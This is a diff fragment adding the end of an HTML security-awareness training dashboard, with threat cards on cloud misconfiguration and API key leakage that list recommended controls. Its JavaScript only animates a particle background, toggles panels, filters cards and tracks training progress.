+                            <i class="fa-solid fa-cloud-meatball"></i>
+                            <h3>Cloud Misconfiguration</h3>
+                        </div>
+                        <span class="sev-badge critical">Critical</span>
+                    </div>
+                    <div class="threat-desc">
+                        Insecure parameters setup in cloud environments (e.g. open S3 buckets, permissive security groups).
+                    </div>
+                    <div class="threat-impact-box">
+                        <strong>Exposure Level</strong>
+                        <p>Public exposure of database dumps and cloud resources to anonymous network sweeps.</p>
+                    </div>
+                    <div class="mitigation-accordion">
+                        <div class="accordion-header" onclick="toggleAccordion(this)">
+                            Recommended Controls <i class="fa-solid fa-chevron-down"></i>
+                        </div>
+                        <div class="accordion-body">
+                            <ul>
+                                <li>Deploy Cloud Security Posture Management (CSPM) audits</li>
+                                <li>Enforce private-by-default parameters on cloud stores</li>
+                                <li>Perform automated IAM permissions sweeps</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="card-footer-controls">
+                        <button class="expand-details-btn" onclick="toggleIntelPanel(this)">
+                            <i class="fa-solid fa-circle-info"></i> Cloud Architecture
+                        </button>
+                        <label class="completion-checkbox-wrapper">
+                            <input type="checkbox" class="completed-chk" onclick="updateTrackingProgress()"> Completed
+                        </label>
+                    </div>
+                    <div class="intel-details-panel">
+                        <div class="intel-details-panel-inner">
+                            <div class="intel-title">Cloud security best practices</div>
+                            <div class="intel-row">
+                                <div class="intel-col"><strong>Exposure Risk</strong><span>Critical Risk</span></div>
+                                <div class="intel-col"><strong>Mapping</strong><span>CSA CCM (Cloud Controls Matrix)</span></div>
+                            </div>
+                            <div class="ascii-diagram-wrapper">AWS Storage ---> [Open Policy] ---> Attacker Sweeps ---> Data Leak</div>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- Card 2 -->
+                <article class="threat-card" data-severity="High" data-category="cloud">
+                    <div class="card-header-top">
+                        <div class="card-icon-title">
+                            <i class="fa-solid fa-file-shield"></i>
+                            <h3>API Key / Secret Leakage</h3>
+                        </div>
+                        <span class="sev-badge high">High</span>
+                    </div>
+                    <div class="threat-desc">
+                        Accidental commit check-in of API authorization keys, credentials, or private files to code repositories.
+                    </div>
+                    <div class="threat-impact-box">
+                        <strong>Exposure Level</strong>
+                        <p>Attacker scans public repositories to hijack billing accounts and cloud resources instantly.</p>
+                    </div>
+                    <div class="mitigation-accordion">
+                        <div class="accordion-header" onclick="toggleAccordion(this)">
+                            Recommended Controls <i class="fa-solid fa-chevron-down"></i>
+                        </div>
+                        <div class="accordion-body">
+                            <ul>
+                                <li>Configure pre-commit git secret scanners hooks</li>
+                                <li>Employ KMS and dynamic secrets rotation stores</li>
+                                <li>Never commit credentials; pull from OS env</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="card-footer-controls">
+                        <button class="expand-details-btn" onclick="toggleIntelPanel(this)">
+                            <i class="fa-solid fa-circle-info"></i> Cloud Architecture
+                        </button>
+                        <label class="completion-checkbox-wrapper">
+                            <input type="checkbox" class="completed-chk" onclick="updateTrackingProgress()"> Completed
+                        </label>
+                    </div>
+                    <div class="intel-details-panel">
+                        <div class="intel-details-panel-inner">
+                            <div class="intel-title">Cloud security best practices</div>
+                            <div class="intel-row">
+                                <div class="intel-col"><strong>Exposure Risk</strong><span>Instant Abuse</span></div>
+                                <div class="intel-col"><strong>Mapping</strong><span>OWASP Top 10 API Security</span></div>
+                            </div>
+                            <div class="ascii-diagram-wrapper">Git Repository ---> Attacker Scans API Key ---> Cloud Hijack</div>
+                        </div>
+                    </div>
+                </article>
+
+            </div>
+        </section>
+
+    </div>
+
+    <!-- Background matrix canvas particles and controls JS script -->
+    <script>
+        // Floating Cyber Particles Canvas Logic
+        const canvas = document.getElementById('particlesCanvas');
+        const ctx = canvas.getContext('2d');
+        
+        let width = canvas.width = window.innerWidth;
+        let height = canvas.height = window.innerHeight;
+        
+        window.addEventListener('resize', () => {
+            width = canvas.width = window.innerWidth;
+            height = canvas.height = window.innerHeight;
+        });
+
+        const particles = [];
+        const maxParticles = 60;
+
+        for (let i = 0; i < maxParticles; i++) {
+            particles.push({
+                x: Math.random() * width,
+                y: Math.random() * height,
+                vx: (Math.random() - 0.5) * 0.4,
+                vy: (Math.random() - 0.5) * 0.4,
+                r: Math.random() * 2 + 1
+            });
+        }
+
+        function animate() {
+            ctx.clearRect(0, 0, width, height);
+            ctx.fillStyle = 'rgba(168, 85, 247, 0.05)';
+            
+            // Draw lines connecting particles
+            for (let i = 0; i < maxParticles; i++) {
+                const p1 = particles[i];
+                p1.x += p1.vx;
+                p1.y += p1.vy;
+                
+                if (p1.x < 0 || p1.x > width) p1.vx *= -1;
+                if (p1.y < 0 || p1.y > height) p1.vy *= -1;
+                
+                ctx.beginPath();
+                ctx.arc(p1.x, p1.y, p1.r, 0, Math.PI * 2);
+                ctx.fillStyle = 'rgba(56, 189, 248, 0.2)';
+                ctx.fill();
+
+                for (let j = i + 1; j < maxParticles; j++) {
+                    const p2 = particles[j];
+                    const dist = Math.hypot(p1.x - p2.x, p1.y - p2.y);
+                    if (dist < 100) {
+                        ctx.beginPath();
+                        ctx.moveTo(p1.x, p1.y);
+                        ctx.lineTo(p2.x, p2.y);
+                        ctx.strokeStyle = `rgba(168, 85, 247, ${0.1 * (1 - dist/100)})`;
+                        ctx.lineWidth = 0.5;
+                        ctx.stroke();
+                    }
+                }
+            }
+            requestAnimationFrame(animate);
+        }
+        animate();
+
+        // Mitigation Accordion Trigger Toggle
+        function toggleAccordion(header) {
+            const body = header.nextElementSibling;
+            const arrow = header.querySelector('i');
+            
+            if (body.style.maxHeight) {
+                body.style.maxHeight = null;
+                arrow.style.transform = 'rotate(0deg)';
+            } else {
+                body.style.maxHeight = body.scrollHeight + "px";
+                arrow.style.transform = 'rotate(180deg)';
+            }
+        }
+
+        // Expand Details Intel Panel Toggle
+        function toggleIntelPanel(btn) {
+            const card = btn.closest('.threat-card');
+            const panel = card.querySelector('.intel-details-panel');
+            
+            if (panel.style.maxHeight) {
+                panel.style.maxHeight = null;
+                btn.innerHTML = '<i class="fa-solid fa-circle-info"></i> Intel details';
+            } else {
+                panel.style.maxHeight = panel.scrollHeight + "px";
+                btn.innerHTML = '<i class="fa-solid fa-circle-minus"></i> Collapse panel';
+            }
+        }
+
+        // Filters states variables
+        let selectedSeverity = "All";
+        let selectedCategory = "All";
+
+        function setSevFilter(sevVal) {
+            document.querySelectorAll("#sevFilters .filter-btn").forEach(btn => btn.classList.remove("active"));
+            document.querySelector(`#sevFilters .filter-btn[data-value="${sevVal}"]`).classList.add("active");
+            selectedSeverity = sevVal;
+            filterThreats();
+        }
+
+        function setCatFilter(catVal) {
+            document.querySelectorAll("#catFilters .filter-btn").forEach(btn => btn.classList.remove("active"));
+            document.querySelector(`#catFilters .filter-btn[data-value="${catVal}"]`).classList.add("active");
+            selectedCategory = catVal;
+            filterThreats();
+        }
+
+        function filterThreats() {
+            const searchVal = document.getElementById("threatSearchInput").value.trim().toLowerCase();
+            const cards = document.querySelectorAll(".threat-card");
+            
+            // Track empty sections
+            const categories = ["identity", "web", "network", "malware", "cloud"];
+            const catMatches = { identity: 0, web: 0, network: 0, malware: 0, cloud: 0 };
+
+            cards.forEach(card => {
+                const title = card.querySelector("h3").innerText.toLowerCase();
+                const desc = card.querySelector(".threat-desc").innerText.toLowerCase();
+                const severity = card.getAttribute("data-severity");
+                const category = card.getAttribute("data-category");
+
+                const matchesSearch = !searchVal || title.includes(searchVal) || desc.includes(searchVal);
+                const matchesSeverity = (selectedSeverity === "All") || (severity === selectedSeverity);
+                const matchesCategory = (selectedCategory === "All") || (category === selectedCategory);
+
+                if (matchesSearch && matchesSeverity && matchesCategory) {
+                    card.style.display = "flex";
+                    catMatches[category]++;
+                } else {
+                    card.style.display = "none";
+                }
+            });
+
+            // Hide sections with 0 matching cards
+            categories.forEach(cat => {
+                const sec = document.getElementById(`sec-${cat}`);
+                if (catMatches[cat] > 0) {
+                    sec.classList.remove("hidden");
+                } else {
+                    sec.classList.add("hidden");
+                }
+            });
+        }
+
+        // Training Progress Tracking
+        function updateTrackingProgress() {
+            const checkboxes = document.querySelectorAll(".completed-chk");
+            let checkedCount = 0;
+            checkboxes.forEach(chk => {
+                if (chk.checked) checkedCount++;
+            });
+
+            const total = checkboxes.length;
+            const percentage = Math.round((checkedCount / total) * 100);
+
+            // Update DOM progress
+            document.getElementById("progressFillBar").style.width = `${percentage}%`;
+            document.getElementById("progressStatsText").innerText = `${checkedCount} / ${total} THREATS`;
+        }
+
+        // Initialize progress tracker values
+        updateTrackingProgress();
+    </script>
+</body>
+</html>
